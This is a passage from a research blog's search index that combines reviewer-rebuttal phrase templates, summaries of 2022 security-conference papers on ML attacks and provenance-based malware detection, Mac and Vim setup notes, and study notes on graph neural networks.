improve on?  How does your method fundamentally differ from other methods?  What specific components of the method cause the improvement?Tips:  Write the related work section as an story.RebuttalSome useful sequences:Opening  Thank you for your suggestion.  Thank you for the positive/detailed/constructive comments.  We sincerely thank all reviewers and ACs for their time and efforts. Below please find the responses to some specific comments.  We thank the reviewers for their useful comments. The common questions are first answered, then we clarify questions from every individual review.  We thank the useful suggestions from the reviewers. Some important or common questions are first addressed, followed by answers to individual reviews.Agree  We thank the reviewer for pointing out this issue.  We agree with you and have incorporated this suggestion throughout our paper.  We have reflected this comment by ‚Ä¶  We can/will add/compare/revise/correct ‚Ä¶ in our revised manuscript/our final version.  Due to the rebuttal policy, ‚Äúauthors should not include new experimental results in the rebuttal‚Äù, additional results may not be included. However, we will add these mentioned experiments and discussions in our final version. Thank you for the constructive comment.Disagree  We respectfully disagree with Reviewer #id that ‚Ä¶  The reviewer might have overlooked Table #id ‚Ä¶  We can compare ‚Ä¶ but it is not quite related to our work ‚Ä¶  We have to emphasize that ‚Ä¶  The reviewer raises an interesting concern. However, our work ‚Ä¶  Thank you for the comment, but we cannot fully agree with the comment. As stated/emphasized ‚Ä¶  You have raised an important point; however, we believe that ‚Ä¶ would be outside the scope of our paper because ‚Ä¶  This is a valid assessment of ‚Ä¶; however, we believe that ‚Ä¶ would be more appropriate because ‚Ä¶Explain  We have indeed stated/included/discussed/compared/reported/clarified/elaborated ‚Ä¶ in our original paper ‚Ä¶ (cf. Line #id).  As we stated in Line #id, ‚Ä¶  We have rewritten ‚Ä¶ to be more in line with your comments. We hope that the edited section clarifies ‚Ä¶Extra Information  We have included a new figure/table (cf. Figure/Table #id) to further illustrate‚Ä¶  We have supplemented the xxx section with explanations of ‚Ä¶  Thank you for the comment. We will explore this in future work.AC Message  Please note that Assigned Reviewer #id has made some statements that are either against the common-sense in our field or self-contradictory (ironically his/her own confidence rating is ‚Äúvery confident‚Äù). blabla  We want to bring to your attention the very flawed review \\#id. This reviewer is self-contradictory, cf. Comment #id1, Comment #id2, and Response #id. blabla  We would like to raise attention to AC that unfortunately Reviewer #id holds a very biased view towards the contributions of our paper. blablaReference:  https://zhuanlan.zhihu.com/p/431583258  https://zhuanlan.zhihu.com/p/104298923  https://medium.com/great-research/storytelling-101-writing-tips-for-academics-d9eec50eec9"
  },
  
  {
    "title": "Usenix Security 2022",
    "url": "/posts/Usenix-2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-08-25 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summary the accepted papers from Usenix Security 2022 which are related to my research interests. Basically, Usenix Security 2022 has three accepted paper lists from summer, fall, an...",
    "content": "In the blog, I summary the accepted papers from Usenix Security 2022 which are related to my research interests. Basically, Usenix Security 2022 has three accepted paper lists from summer, fall, and winter:  Summer: https://www.usenix.org/conference/usenixsecurity22/summer-accepted-papers  Fall: https://www.usenix.org/conference/usenixsecurity22/fall-accepted-papers  Winter: https://www.usenix.org/conference/usenixsecurity22/winter-accepted-papersInteresting Paper list  Summer          Back-Propagating System Dependency Impact for Attack Investigation      ML-Doctor: Holistic Risk Assessment of Inference Attacks Against Machine Learning Models      DeepDi: Learning a Relational Graph Convolutional Network Model on Instructions for Fast and Accurate Disassembly      Distinguished Paper Award: Online Website Fingerprinting: Evaluating Website Fingerprinting Attacks on Tor in the Real World      Rapid Prototyping for Microarchitectural Attacks      On the Security Risks of AutoML      Inference Attacks Against Graph Neural Networks      WebGraph: Capturing Advertising and Tracking Information Flows for Robust Blocking      Distinguished Paper Award: [Dos and Don‚Äôts of Machine Learning in Computer Security](https://www.usenix.org/conference/usenixsecurity22/presentation/arp      Label Inference Attacks Against Vertical Federated Learning        Fall          PatchCleanser: Certifiably Robust Defense against Adversarial Patches for Any Image Classifier      Poisoning Attacks to Local Differential Privacy Protocols for Key-Value Data      Transferring Adversarial Robustness Through Robust Representation Matching      Distinguished Paper Award: Provably-Safe Multilingual Software Sandboxing using WebAssembly      On the Necessity of Auditable Algorithmic Definitions for Machine Unlearning      Mitigating Membership Inference Attacks by Self-Distillation Through a Novel Ensemble Architecture      Membership Inference Attacks and Defenses in Neural Network Pruning      How Machine Learning Is Solving the Binary Function Similarity Problem      FLAME: Taming Backdoors in Federated Learning        Winter          AutoDA: Automated Decision-based Iterative Adversarial Attacks      Poison Forensics: Traceback of Data Poisoning Attacks in Neural Networks      Blacklight: Scalable Defense for Neural Networks against Query-Based Black-Box Attacks      I will keeping summarizing the interesting papers here.Poison Forensics: Traceback of Data Poisoning Attacks in Neural NetworksPaperAuthor: Shawn Shan, Arjun Nitin Bhagoji, Haitao Zheng, Ben Y. ZhaoMain IdeaThe paper points out the impossibility for the defense of adaptive adversarial attacks and provides a traceback method to tell the adversarial examples.Key insightExperimentsDos and Don‚Äôts of Machine Learning in Computer SecurityPaperAuthor: Daniel Arp, Erwin Quiring, Feargus Pendlebury, Alexander Warnecke, Fabio Pierazzi, Christian Wressnegger, Lorenzo Cavallarok, Konrad RieckMain IdeaThis paper lists ten common issues in the AI security papers with the explanations and potential solutions. It also decorates them by analysizing the impact with examples.The figure shows the ten pitfalls and their corresponding stages in the ML workflow.Key insightPitfalls list  Data collection and Labeling          Sampling Bias: The collected data are not representitive enough to show the real data distribution.      Label Inaccuracy: The ground truth labels are not accurate, stable.        System Design and Learning          Data Snooping: The training data are not available in practice.      Spurious correlations: Unrelated shortcut patterns for separating classes.      Biased Parameters: Some parameters are based on the test set instead of fixing at training time.        Performance Evaluation          Inappropriate Baselines: Without or with limited baseline methods is in appropriate.      Inappropriate Measures: The performance measures do not account for the constraints of the application scenario.      Base rate Fallacy: One class imbalance which does not consider when interpreting the performance measures.        Deployment and Operation          Lab-only Evaluation: The leaning model is evaluated in a lab environment only instead of discussing the practical limitations.      Inappropriate Threat Model: The robustness of machine learning models is negelected such as poisoning and evasion attacks.      Impact AnalysisThe paper works on four applications:  Mobile malware detection  Vulnerability discovery  source code authorship attribution  network intrusion detection"
  },
  
  {
    "title": "Paper Summary 2022",
    "url": "/posts/Paper_Summary_2022/",
    "categories": "Papers, Reading",
    "tags": "",
    "date": "2022-07-02 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summarize the papers I feel interested and record some thoughts when reading.Rethinking Graph Neural Netowrks for Anomaly Detectionpaper/codeMain IdeaBased on the observation that an...",
    "content": "In the blog, I summarize the papers I feel interested and record some thoughts when reading.Rethinking Graph Neural Netowrks for Anomaly Detectionpaper/codeMain IdeaBased on the observation that anomalies lead to the right-shift effect in spectral energy distribution from low-frequencies to high frequencies, the paper propose Beta Wavelet GNN to get better performance.Key insight  Spectral Analysis of Graph Anomaly                                                      They define the anomaly degree $\\sigma /              \\mu              $ wherethe graph features are independent frawn from a Gaussian distribution: $x\\sim N(\\mu e_N,\\sigma^2I_N)$.                                          They observe that with the increase of the degree of anomaly nodes, the spectral energy concentrate less on low-frequency eigenvalues.      They redefine the high-drequency area to avoid the high cost of eigen-decomposition:                  \\[S_{high}=\\int_0^{\\lambda_N} 1-f(t)dt\\]                                Hammond‚Äôs Graph Wavelet          It is composed of a mother wave and a group of wavelet bases: $W=(W_{\\psi_1}, W_{\\psi_2},\\cdots)$      $W_{\\psi_i}(x)=Ug_i(\\Lambda)^T x$ where $g_i(\\cdot)$ is a kernel function and $g_i(\\lambda)=diag(g_i(\\lambda))$.  -        Beta Wavelet on Graph  Beta Wavelet Graph Neural Network          $Z_i=W_{i, C-i}(MLP(X))$      $H=AGG([Z_0, Z_1, \\cdots, Z_C])$      ExperimentsDatasets:  YelpChi  AmazonComparisons:  MLP/SVM  GCN/ChebyNet/GAT/GraphSAGE‚Ä¶  GraphConsis/CAREGNN‚Ä¶A Comparative Study for Unsupervised Network Representation LearningarxivMain IdeaThe paper summarizes several unsupervised network representation learning (UNRL) approaches over graphs:  Random Walk based  Matrix Factorization  Deep Learning basedThey consider 9 UNRL methods and 11 datasets on two tasks: node classification and link prediction, and analyze all of them to show a clear blueprint of the topic.The involved algorithms are listed in the table:ExperimentsDatasets:Graph Structure of Neural Networksarxiv/code/ ICML2020Main IdeaThe paper takes the neural networks as graphs and develops a graph-based representation called relational graph. Then they design a graph generator WS-flex to systematically explore the design space of neural networks.In the Average Path Length-Clustering Coefficient figures, they claim to find sweet spots to find the best performance models. They furthermore provide a quick way to identify a sweet spot.SIGL: Securing Software Installations Through Deep Graph LearningarXivMain IdeaThe paper designs a tool, SIGL, to detect malicious behavior on software installation. It first build the provenace graphs by system call activities. Then it uses Graph LSTM as an autoencoder to generate embeddings.System Overview:  Data Collection and Featurization  Model Training and Validation  Anomaly Detection and Prioritization    Key insights    Formalize the problem of detecting malicious software installation.  Define the Software Installation Graphs and use an autoencoder to generate graph-level embeddings.Threat modelThey define the installation behavior of a software package as a chain of system events which can be displayed as a directed acyclic graph. Nodes represent processes and objects while edges represent interactions. The operating system and audit framework are benign.ExperimentsDataset: synthetic dataset on Windows ETW and Linux AduitIt also consider the poisoning attack and adversarial attack. For poisoning attacks, different ratios of malware data from 5% to 25% are added.For adversarial attacks, they design restrict black-box attack (RBA) including feature and structure attacks and practical black-box attack (PBA) including hierarchical reinforcement learning attack.You are what you do: Hunting Stealthy Malware via Data Provenance Analysispaper/slide/videoMain ideaThe paper designs a provenance-based approach ProvDetector to detect stealthy malware.  Provenance graph building  Representation Extraction          Rareness-based path selection        Embedding  Anomaly DetectionKey insights  Detection of marginal deviation: Impersonation-based stealthy malware blends into benign programs. ProvDetector needs to identify and isolate the marginal outlier events from the benign behaviors.  Scalable model building: The size of provenance graphs is super large. ProvDetector works on the suspicious subgraphs by ranking the top $K$ uncommon causal paths.Threat ModelThe paper concentrates on stealthy malware that leverages legitimate methods or machine services from the victim‚Äôs host to exploit and execute malicious activities.  The operating systems and the loggers are benign or in the trusted computing base (TCB) and the adversary cannot change the records.  The side channel attack is also not consideredExperimentsThey collected process instances from 23 programs. In conclusions, they tested on 1150 malware samples that hijack benign processes.They also evaluated the interpretation of detection results.  Simple models do not perform well because they can only consider one hop neighborhoods.  Whole Graph modeling is not a good feature based on their experiments when they use graph2vec to detect hijacked process attacks.Log2vec: A heterogeneous Graph Embedding Based Approach for Detecting Cyber Threats within Enterprisepaper/Main ideaThe paper design an embedding generator to detect malicious logs. It firstly build a heterogeneous graph from logs  that each node represents the log event and they design 10 rules to decide the edges. Basically, the edges show the common hosts or temporal sequence between nodes.In general, the heterogeneous graph looks like a self-defined connections instead of the raw node interaction structures.After the graph generating, they use random walk and word2vec to generate the node embedddings and clustering algorithm to detect anomaly nodes.Key insights  The graph definition is totally different from provenance graphs. It looks like a multi-dimensional log sequence.  It did not use GNN models. Instead, Random walk + word2vec is used.Experimentsdatasets:  cert  LANLLearning Causal Effects on Hypergraphspaper/codeMain IdeaThe paper concentrates on individual treatment effect (ITE) estimation on hypergraphs. One example of ITE estimation is how much an intervention (wearing face covering) will causally afect an outcome (COVID-19 infection) of each individual node. They use a hypergraph neural network to learn high-order interference.Key insights  The first one works on the problem of ITE estimation under high-order interference on hypergraphs.  Design a framework to models confounders and high-order interference by representation learning and hypergraph neural networks.ExperimentsDataset: Semi-synthetic data from Contact, Goodreads and Microsoft Teams.Multi-Dimensional Network Embedding with Hierarchical StructurepaperMain IdeaThe paper designs a multi-dimensional graph model that considers the edge types and node types in different layers/dimensions. For example, if a set of nodes can be shown as users/products and edges can be viewing or purchasing, we can draw two graphs that represent viewing and purchasing information. In that case, two graphs have same nodes but different edges.Model Structure  For different edge types, using a specific embedding to record the dimension information.  For different node types, using an embedding to record the hierarchical strucutre information.  Use a skip-gram model to learn the embeddings. And simply adding the embeddings together.GraphMAE: Self-Supervised Masked Graph Autoencoderspaper/codeMain IdeaThe paper focuses on Self-supervised Learning (SSL) by graph autoencoders (GAEs). It lists four common problems of the current models:  The structure information is over-emphasized.  Feature reconstruction without corruption is not robust.  The mean square error is sensitive and unstable.  The decoder architectures are of little expressiveness.They improve the following parts:  Masked feature reconstruction.  Scaled cosine error.  Re-mask decoding.Background of Self-supervised Learning[1]  Generative: Use an encoder to generate middle vector $z$ and use an decoder to rebuild the orginal input $x$.  Contrastive: After getting the middle vector $z$, compare the similarity.  Generative-Contrastive: Based on the generative model, use a large model like ResNet to compare them.Model Techniques  Use feature reconstruction as the objective.  Reconstruct the masked features and apply a uniform random sampling strategy.  Use a GNN-decoder with re-mask decoding.  Use scaled cosine error as the criterion.Reference:            Self-supervised Learning: Generative or Contrastive      "
  },
  
  {
    "title": "S&P2022",
    "url": "/posts/S&P_2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-06-01 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summary the accepted papers from S&amp;P 2022 which are related to my research interests from the link.Papers:  BadEncoder: Backdoor Attacks to Pre-trained Encoders in Self-Supervise...",
    "content": "In the blog, I summary the accepted papers from S&amp;P 2022 which are related to my research interests from the link.Papers:  BadEncoder: Backdoor Attacks to Pre-trained Encoders in Self-Supervised Learning  DEPCOMM: Graph Summarization on System Audit Logs for Attack Investigation  DeepCASE: Semi-Supervised Contextual Analysis of Security Events  Effective Seed Scheduling for Fuzzing with Graph Centrality Analysis  LinkTeller: Recovering Private Edges from Graph Neural Networks via Influence Analysis  Membership inference attacks from first principles  Model Stealing Attacks Against Inductive Graph Neural Networks  ShadeWatcher: Recommendation-guided Cyber Threat Analysis using System Audit Records  WtaGraph: Web Tracking and Advertising Detection using Graph Neural NetworksDEPCOMM: Graph Summarization on System Audit Logs for Attack Investigationpaper/codeMain IdeaDepComm is a provenance graph summarization framework which uses InfoPaths to capture the attack-related processes and assist attack investigation.  Graph Summarization:          Process-based community Detection: Hierarchical Random Walk considering local neighbors and global process lineage trees.      Community Compression      Community Summarization: including a master process, time span, the top-ranked infoPath        Attack Investigation: find the events close to the POI (Point of Interest)Key insight (Why is the paper better than others?)The challenges:  The provenance graphs are heterogeneous while a general summarization takes the nodes equally.  The provenance graphs have plenty of trival and irrelevant dependencies.  No suitable graph summarization techniques.The insights:  It partitions graphs into process-centric communities (a group of processes and resources accessed by the processes) based on the observations:          The cooperated process nodes (intimate processes) either have strong correlation or data dependencies through resource nodes which means:                  They have parent-child relationships.          They share the same parent process and have data dependencies.          They summarize 8 different schemes for parent-child nodes, resources to list the way hierarchical random walk works.                      It compresses the edges by process and resource patterns.          Process-based patterns: the middle processes of the begin and end processes are parallel.      Resource-based patterns: the middle resources of the begin and end processes are parallel.        It prioritizes the InfoPaths to show the attack steps or major system activities at the top.ExperimentsDatasets:  Darpa TC 3Details:  Compare with Nodoze.  Cooperate with HOLMES.Comments:  It does not think about the temporal information.  The main insight is the graph summarization.  POI (Point of interest) is required.DeepCase: Semi-supervised Contextual Analysis of Security Eventspaper/codeMain IdeaThe paper designs a semi-supervised context-based suspecious event detector DeepCase to reduce the false positive alerts.The Model is composed of the following parts:  Context Builder          Encoder: Embedding layers+Recurrent layers      Attention Decoder        InterpreterKey InsightsThe previous methods concentrate on:  reducing the number of false positive ratio by improving individual detectors  prioritizing alerts (alert triaging)          miss some relatively benign events from a complicated attack.      Deepcase addresses the challenges (Complex relations, Evolving, Explainable):  handle complex relations within sequences of events from an evolving threats  remain explainable to security operators.ExperimentsDatasets:  Lastline  HDFSComparisons:  Cluster N-gram‚Ä¶ShadeWatcher: Recommendation-guided Cyber Threat Analysis using System Audit Recordspaper/codeMain IdeaThe paper leverages user-item interactions in recommendation systems and design a new framework ShadeWatcher to predict the system entity preferences on interactive entities to detect threats on audit records with the help of the high-order information.The high-order information here means the side information like genre of movies, type of files and other non-topology information.ShadeWatcher has three parts:  Knowledge Builder  Recommendation Model  Threat Detector and Adaptor          Retrain with the new negative instance.      Key insightThe problems of the current methods:  Statistics-based detection: high false positive rate.  Specification-based detection: time-consuming and domain expertise needed.  Learning-based detection:          No explicable results or insights on the essential indicators or root causes of the attacks.      Extra manual efforts needed.      ShadeWatcher leverages high-order information in the knowledge graphs to help the model detect malicious interactions.ExperimentsDatasets:  Trace from Darpa 3  Simulated DatasetEvaluation  on normal workloads  on classificationCompare with  Poirot  Morse  UnicornEfficiency"
  },
  
  {
    "title": "Macbook Summary",
    "url": "/posts/Macbook_Summary/",
    "categories": "",
    "tags": "System",
    "date": "2022-05-24 00:00:00 -0700",
    





    
    "snippet": "How to develop your personal Mac Environment for programDownloaded Applications:  Chrome  iTerm2 by Homebrew  VsCode insider  OneNote  ToDo List (Microsoft)  Wechat  Zoom  Obsidian (Markdown)  Oned...",
    "content": "How to develop your personal Mac Environment for programDownloaded Applications:  Chrome  iTerm2 by Homebrew  VsCode insider  OneNote  ToDo List (Microsoft)  Wechat  Zoom  Obsidian (Markdown)  OnedirveProgram:  iTerm 2          Powerlevel10k: https://github.com/romkatv/powerlevel10k (On-my-zsh)      Theme: Dracula+      zsh-autosuggestions      zsh-syntax-highlighting        Vim          Vundle: plugin manager      1. Tamper monkeyIt is a chrome plugin which can write scripts to auto-complete some tasks. Some well-done scripts are available from Greasy Fork.There is a book diving into Greasemonkey, a similar plugin of Firefox. I will record several important parts here.1.1 Basic Concepts1.2 Writing Scripts2. Vim ConfigurationVim is one of the best text editors which is highly configurable in Unix.Quick Start:  git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim  vim ~/.vimrc: vim configuration file  Launch vim and run :PluginInstallTips:      use :set encoding=utf-8 to resolve the display problem in Chinese        use :h vundle to acquire specific helps and commands  Tmux ConfigurationTmux is a remote server connecting tool which can keep long-term connections without breaking down.The configuration files come from gpakosz.tmux configuration filetmux.local configuration fileOh-my-zshOh-my-zsh is a useful and friendly command tool with a lot of functions."
  },
  
  {
    "title": "NDSS2022",
    "url": "/posts/NDSS_2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-04-01 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summary the accepted papers from NDSS 2022 which are related to my research interests from the link.Paper list:  Session 2C: ML and AI          Tetrad: Actively Secure 4PC for Secure...",
    "content": "In the blog, I summary the accepted papers from NDSS 2022 which are related to my research interests from the link.Paper list:  Session 2C: ML and AI          Tetrad: Actively Secure 4PC for Secure Training and Inference      MIRROR: Model Inversion for Deep Learning Network with High Fidelity      Local and Central Differential Privacy for Robustness and Privacy in Federated Learning                  The paper evaluate the effect of LDP and CDP to protect the FL model robustness from membership, backdoor attacks.                    DeepSight: Mitigating Backdoor Attacks in Federated Learning Through Deep Model Inspection                  Analyze the data distribution features to identify malicious model updates in the federated learning                      Session 4C: ML and AI          What You See is Not What the Network Infers: Detecting Adversarial Examples Based on Semantic Contradiction                  Analyze the adversarial examples‚Äô internal features.          A pretty interesting story.                    Euler: Detecting Network Lateral Movement via Scalable Temporal Graph Link Prediction                  Temporal GNN model.                    Fooling the Eyes of Autonomous Vehicles: Robust Physical Adversarial Examples Against Traffic Sign Recognition Systems                  Adversarial attack on the objective detection models like YOLO v5.                    FedCRI: Federated Mobile Cyber-Risk Intelligence                  Cyber-Threat Intelligence                      Session 5C: Attacks on ML and AI          ATTEQ-NN: Attention-based QoE-aware Evasive Backdoor Attacks                  Attention-based evasive backdoor attack.          The paper is interesting: Leveraging the image generator techniques to generate the trigger or backdoor!                    RamBoAttack: A Robust and Query Efficient Deep Neural Network Decision Exploit                  A query efficient attack.                    Property Inference Attacks Against GANs      Get a Model! Model Hijacking Attack Against Machine Learning Models      DeepSight: Mitigating Backdoor Attacks in Federated Learning Through Deep Model Inspectionpaper/codeMain IdeaKey insightExperiments"
  },
  
  {
    "title": "Graph Neural Network",
    "url": "/posts/Graph_Neural_Network/",
    "categories": "",
    "tags": "Graph Neural Networks",
    "date": "2022-03-13 00:00:00 -0800",
    





    
    "snippet": "In the blog, I exploit and summary the graph neural networks and related concepts based on some online blogs, papers and the book ‚ÄúDeep Learing on Graphs‚Äù.At first, the motivations of graph neural ...",
    "content": "In the blog, I exploit and summary the graph neural networks and related concepts based on some online blogs, papers and the book ‚ÄúDeep Learing on Graphs‚Äù.At first, the motivations of graph neural networks can be described as follows:  Feature Engineering: select a small subset of the graph features that have minimal redundancy but maximal relevance to the target.          Here is an example: given a graph $\\mathcal{G}={\\mathcal{V}, \\mathcal{E}}$ where $\\mathcal{V}$ means the vertices and $\\mathcal{E}$ shows the edges. It is assumed that each vertex has a set of features $\\mathcal{F}={f_1,f_2,\\dots f_d}$ and the goal is to select $K$ features from $\\mathcal{F}$ to denote the node where $K\\ll d$.        Representation Learning: automatically learn the features based on the downstream tasks.          Basically, the goal is to train a mapping function $f:X\\rightarrow Y$ that map the node features $\\mathcal{F}$ in $R^d$ to embeddings $\\mathcal{E}$ in $R^K$.      The tasks of graph cover many fields:  Supervised Learning: most of them are based on the whole graphs.          Graph Classification: Classify the label of a set of graphs.        Semi-supervised Learning:          Inductive Learning: do not know the whole graph when training.      Tranductive Learning: know the whole graph when training.                  Transductive Node classification: Classify the label of a set of nodes.                      Unsupervised Learning:Consequently, the graph neural network have the following advantages:  They can handle graphs better than CNNs or RNNs.  They can do propagation guided by the graph structure based on edges instead of taking edges as the features of nodes.  They can learn reasoning graphs from non-structural data.0. Foundations0.0 GraphsIn the section, the concepts of graphs are introduced and defined formally.A graph is defined based on the nodes and edges: $\\mathcal{G}={\\mathcal{V}, \\mathcal{E}}$ where $\\mathcal{V}$ means the set of vertices and $\\mathcal{E}$ shows the edges.In most of the cases, the whole graph connectivity is recorded by the Adjacency Matrix $\\mathcal{A} \\in {0,1}^{N\\times N}$ where $\\mathcal{A}{i,j} = 1$ if vertice $v_i$ and $v_j$ is connected. Otherwise $\\mathcal{A}{i,j} = 0$. For each node, the degree is defined as the number of the nodes it connects.\\(d(v_i)=\\sum_{v_j \\in \\mathcal{V}}\\mathcal{1}(v_i, v_j)\\)0.0.1 CentralityCentrality is an important feature to show the node importance in a graph. There are four different types:  Degree Centrality: the number of each node degree. (Treat all neigbhours equally)  Eigenvector Centrality: the corresponding elements in the eigenvector $c_e$ of the largest eigenvalue $\\lambda$ for the adjacency matrix $A$ show the nodes‚Äô centrality scores because $\\lambda \\cdot c_e = A \\cdot c_e$ which originates from the definition of the eigenvector centrality $c_e(v_i)=\\frac{1}{\\lambda}\\sum_{j=1}^N A_{i.j}\\cdot c_e(v_j)$. (Treat neighbours with different weights)  Katz Centrality: add the constant to the definition of the eigenvector centrality. $c_k=\\alpha A c_k+\\beta$.Betweenness Centrality: Instead of checking the neighbours, betweenness centrality counts the paths through each node. It is calculating cost because all the nodes pair should be considered to get the final score.0.0.2 Spectral Graph Theory  Laplacian Matrix: $L=D-A$ where $D$ is a diagonal degree matrix and $A$ is the adjacency matrix. As to the eigenvalues and eigenvectors of the Laplacian Matrix there are two theorems:          $L$ is nonnegative.      The number of 0 eigenvalues equals the number of the connected components in the graph.      0.0.3 Complex Graphs  Heterogeneous graphs: different types of vertices and edges.  Bipartite graphs: the vertex set can be divided into two disjoint subsets which means each edge connects two vertices from two subsets.  Multidimensional graphs: different types of edges.  Signed graphs: positive and negative edges.  Hypergraphs: replace the edges to the areas to show the connections.  dynamic graphs: the graphs are changing based on the timestamps.0.0.4 TasksNode classificationLink PredictionGraph Classifiation0.1 Deep Learning0.1.0 Deep Feedforward NetworksFeedforward Networks are the basic deep learning model which are built by a multilayer neurons. Each layer can be represented by $f^{(i)}$ and the whole model can be represented as $F(x)=f^{(n)}(f^{(n-1)}(\\cdots f^{1}(x)))$. The model starts from the input layer and then feedforward the data into the hidden layers and finally return the results from the output layer.For each neuron in the hidden layers, its function is like\\(h = \\alpha(b+\\sum_{i=1}^n w_i\\cdot x_i)\\)where $\\alpha(\\cdot)$ is the activation function, $w_i$ is the weight and $b$ is the bias.Activation Functions  Recitifer: $ReLU(z)=max{0, z}$.  Logistic sigmoid: $\\sigma(z)=\\frac{1}{1+exp(-z)}$  tanh: $tanh(z)=\\frac{2}{1+exp(-2\\cdot z)}-1=2\\cdot\\sigma(2z)-1$0.1.1 Convolutional Neural NetworkA common situation for the convolution operation is that there is a noisy signal $f(t)$ and we want to average the value at time $t$ with its nearby values by a weight function $g(c)$.The basic convolution operation can be defined as \\((f\\ast g)(t)=\\int_{\\tau=t-n}^{t+n}f(\\tau)g(t-\\tau)d\\tau\\)In the practical machine learning scenario, the convolution operation can be extended to data with high dimensions. For a two dimensional image $I$, the convolution operation can be performed with a two-dimensional kernel $K$:\\(S(i,j) = (I\\ast K)(i,j)=\\sum_{\\tau=i-n}^{i+n}\\sum_{j=\\gamma-n}^{\\gamma+n}I(\\tau, \\gamma)K(i-\\tau,j-\\gamma)\\)So basically, the convolution operation in deep learning originate from the one in signal processing with the similar physical meaning.0.1.2 Recurrent Neural NetworkThe input of the RNN is a sequence and each neuron has two outputs: $y^{(i)}$ and $h^{(i)}$.\\(h^{(i)}=\\alpha(W_{hh}\\cdot h^{(i-1)}+W_{hx}x^{(i-1)}+b_{h})\\)\\(y^{(i)}=\\alpha(W_{yh}h^{(i)}+b_y)\\)where $W$s are the matrices to perform linear transformations, $b$s are the bias terms and $\\alpha$ is the activation function.  Long Short-Term Memory: each neuron contains two states: the cell state and the hidden state.  Gated Recurrent Unit: it combines the cell state and the hidden state are merged and the forget gate and the input gate are combined as the update gate.    0.1.3 Tips    Preventing Overfitting:    Weight Regularization  Dropout  Batch NOrmalizationChapter 1: Basic ConceptsThe goal of graph neural networks is to learn a state embedding which encodes the neighborhoods‚Äô information. The state embedding $h_v$ is used to produce an output $o_v$  such as the distribution of the predicted node label. Basically, the parametric function $f$ shared among all nodes which is called local transition function. Another parametric function $g$ produce the output of the node which is called local output function. They are defined as follows where $co[v]$ and $ne[v]$ means the edges and neighbors of node $v$.\\[\\begin{align}&amp;h_v=f(x_v,x_{co[v]},h_{ne[v]},x_{ne[v]})\\\\&amp;o_v=g(h_v,x_v)\\end{align}\\]In the matrix style, the above formulas can be presented as follows.\\[\\begin{align}&amp;H^{t+1}=F(H^t,X)\\\\&amp;O=G(H,X_N)\\end{align}\\]With the target information $t_v$ for the supervision, the loss function can be written as:\\(loss=\\Sigma_{i=1}^p(t_i-o_i)\\)where $p$ is the number of supervised nodes.Basically, there are two kinds of approaches: spectral methods and spatial methods. The former one trains on  the Laplacian eigenbasis which depends on the graph structure while the later one define convolutions directly on the graph based on spatially close neighbors.Chapter 2: Graph Convolutional Networks$K=1$ What does that mean?\\[g_\\theta\\cdot x\\approx\\theta'_0x+\\theta'_1(L-I_N)x=\\theta'_0x-\\theta'_1D^{-\\frac{1}{2}}AD^{-\\frac{1}{2}}x\\]with two free parameters $\\theta‚Äô_0$ and $\\theta‚Äô_1$.\\[Z=\\tilde D^{-\\frac{1}{2}}\\tilde A\\tilde D^{-\\frac{1}{2}}X\\Theta\\]At the very beginning, the definition and related concepts of Graph Neural Network should be clear.$D$ is degree matrix. $A$ is adjacency matrix. In a graph, the first-order derivative is defined as \\(f'_{*g}(x)=f(x)-f(y)\\) and $y$ is the neighborhood of $x$. So the Laplacian operator, the second-order derivative, is defined as \\(\\Delta_{*g}f'(x)=\\Sigma_{y\\sim x}f(x)-f(y)\\) which can be also presented as \\(L=D-A=I_N-D^{-\\frac{1}{2}}AD^{-\\frac{1}{2}}\\)Chapter 4: Graph EmbeddingGraph Embeddings are used to map nodes from a graph to a feature space with lower dimensions. The goal of designing the map function is from the answer of the two questions:1. What information should be keep?2. How to preserve the information?Several papers answered the first question:  neighborhood information:          Perozzi, Bryan, Al-Rfou, Rami, and Skiena, Steven. 2014. Deepwalk: Online learning of social representations. Pages 701‚Äì710 of: Proceedings of the 20th ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM.      Tang, Jian, Qu, Meng, Wang, Mingzhe, Zhang, Ming, Yan, Jun, et al. 2015. Line: Largescale information network embedding. Pages 1067‚Äì1077 of: Proceedings of the 24th International Conference on World Wide Web. International World Wide Web Conferences Steering Committee      Grover, Aditya, and Leskovec, Jure. 2016. node2vec: Scalable feature learning for networks. Pages 855‚Äì864 of: Proceedings of the 22nd ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM.        nodes‚Äô structure role:          Ribeiro, Leonardo F.R., Saverese, Pedro H.P., and Figueiredo, Daniel R. 2017. struc2vec: Learning node representations from structural identity. Pages 385‚Äì394 of: Proceedings of the 23rd ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM        nodes‚Äô status  community informationAs to the second question, the basic idea is to make sure the node representations can reconstruct the graphs with the information need to be preserved.4.1 Simple GraphsNode co-occurrence/Neighborhood  Random Walk  node2vec  LineStructural RoleNode StatusCommunity Structure4.2 Complex GraphsHeterogeneousBipartite GraphMultidimensional GraphSigned GraphHypergraphDynamic GraphChapter 7: Scalable Graph Neural NetworksReference:  Ma, Yao, and Jiliang Tang. Deep learning on graphs. Cambridge University Press, 2021.  "
  },
  
  {
    "title": "Adversarial attack on Graph Neural Network for Node Classification",
    "url": "/posts/Adversarial_Attacks_on_Graphs/",
    "categories": "",
    "tags": "Paper",
    "date": "2022-02-13 00:00:00 -0800",
    





    
    "snippet": "In the blog, I will discuss several papers about attack methods on Graph Convolutional Networks for Node Classification while there are also many other tasks which are deserved digging into like Co...",
